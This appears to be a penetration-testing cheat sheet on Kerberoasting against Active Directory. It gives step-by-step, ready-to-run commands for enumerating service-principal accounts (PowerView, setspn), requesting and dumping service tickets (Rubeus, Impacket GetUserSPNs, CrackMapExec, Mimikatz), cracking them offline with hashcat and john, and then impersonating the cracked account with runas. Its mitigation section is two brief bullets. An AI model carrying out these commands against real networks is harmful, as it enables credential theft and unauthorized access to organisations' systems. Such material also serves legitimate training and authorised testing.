# Kerberoasting

**Kerberosting** is a post-exploitation attack technique that attempts to **obtain a password hash** of an Acrive Directory account that has a **Service Principal Name (SPN)** enabled.\
In such an attack, an authenticated domain user requests a Kerberos ticket for an SPN. The retrieved Kerberos ticket is encrypted with the hash of the service account password affiliated with the SPN. The adversary then works offline to **crack the password hash**, often using brute force technique.\
Once the plaintext credentials of the service account are obtained, the adversary **can impersonate the account owner** and inherit access to any systems, assets or networks granted to the compromised account.

{% hint style="info" %}
**Kerberoasting** is a method of obtaining service account credentials by requesting service tickets from a domain controller and cracking them offline. It allows the attacker to gain access to network resources by using the service account's password hash. **Pass-the-Ticket**, on the other hand, is a technique where an attacker steals a Kerberos ticket-granting ticket (TGT) from a user's session and uses it to impersonate the user to gain access to network resources.
{% endhint %}



#### Methodology:

* **Identify accounts** that have a Service Principal Name (SPN) enabled
* **Request a TGS ticket** for the specified SPN using Kerberos
* **Crack** the password from the TGS ticket.

## Identify Kerberostable account

First we have to detect all user in the domain that has "**Service Principal Name (SPN)**" option **enabled**.

### PowerView (Windows)

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

```powershell
# import the module
powershell -ep bypass
. .\PowerView.ps1
```

<pre class="language-powershell"><code class="lang-powershell"><strong>Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
</strong>Get-NetUser -SPN | select serviceprincipalname
</code></pre>

```powershell
Invoke-Kerberoast
Get-DomainObject -Identity $ACCOUNT_NAME 
```

### setspn.exe (Windows)

**setspn.exe** is a built-in binary. Focus on user accounts.

```powershell
setspn.exe -Q */*
setspn -T $CD_NAME -Q */*
```

<figure><img src="../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>



### kerberost tool (Linux)

{% embed url="https://github.com/skelsec/kerberoast" %}

Install the package with pip:

```bash
pip3 install kerberoast
```

Run this commands:

{% code overflow="wrap" %}
```bash
kerberoast ldap spn 'ldap+ntlm-password://$DOMAIN.local\$USER:$PASS@$DC_IP' -o kerberoastable
```
{% endcode %}



## Get TGS tickets

Once we have a list with all kerberostable account, we can try to get the TGS of the accounts.

### Rubeus.exe (Windows)

{% embed url="https://github.com/GhostPack/Rubeus" %}

Transfer the executable into a WIndows target and run it:

```powershell
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:
.\Rubeus.exe kerberoast /simple /outfile:hashes.kerberoast
```

### Msfconsole (Linux)

```bash
msf> use auxiliary/gather/get_user_spns
```



### targetedKerberoast

{% embed url="https://github.com/ShutdownRepo/targetedKerberoast" %}

{% code title="Installation" %}
```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
```
{% endcode %}

{% code title="Usage" %}
```bash
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```
{% endcode %}

### GetUserSPNs.py (Linux)

The Impacket script **GetUserSPNs (Python)** can perform all the necessary steps to request a ST for a service given its SPN and valid domain credentials.

{% embed url="https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py" %}

Copy the script and run this commands:

{% code overflow="wrap" %}
```bash
GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN.local/$USER -outputfile hashes.kerberoast

# with a password
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $DC_IP
'DOMAIN/USER:Password'

# with an NT hash
GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip
$DC_IP 'DOMAIN/USER'
```
{% endcode %}

### CrackMapExec

```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting
kerberoastables.txt --kdcHost $DC_IP
```



### setspn (Windows)

{% code overflow="wrap" %}
```powershell
# Get TGSs for all kerberostable accounts
setspn.exe -T $DOMAIN.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } 

# List kerberos tickets in memory
klist

# Import the module in powershell
. .\Invoke-Mimikatz.ps1

# extract the tgs tickets from memory
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
{% endcode %}

### PowerView

```powershell
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$SPN" 
```

Once the object has created we can use tool like mimikatz to extract the ticket.

Copy the mimikatz invoke into a file and transfer it into a target machine.

{% embed url="https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" %}

```powershell
# Import the module in powershell
. .\Invoke-Mimikatz.ps1

# extract the tgs tickets from memory
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

This command create a file named with the TGS ticket to crack

<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

## Crack the TGS tickets

### tgsrepcrack (.kirbi crack)

{% embed url="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" %}

Copy the script above and run it:

```bash
python tgsrepcrack.py /PATH/TO/rockyou.txt $TGS_TICKET.kirbi
```

### .txt output crack

```bash
hashcat -m 13100 -o creds.txt -a 0 ./$KRB5TGS.txt ./rockyou.txt

john --format=krb5tgs --wordlist=.../rockyou.txt $KRB5TGS.txt
```



## Use Cracked Creds

Once we have obtained the credentials from tgs tickets, we can impesonate the hacked account.

```powershell
# spawn a powershell as hacked account
runas /netonly /User:$USER powershell.exe
```







## Resources:

{% embed url="https://www.picussecurity.com/resource/blog/kerberoasting-attack-explained-mitre-attack-t1558.003" %}





## Mitigations

To avoid this type of attack, we can:

* Use strong Passwords
* Least Privilege





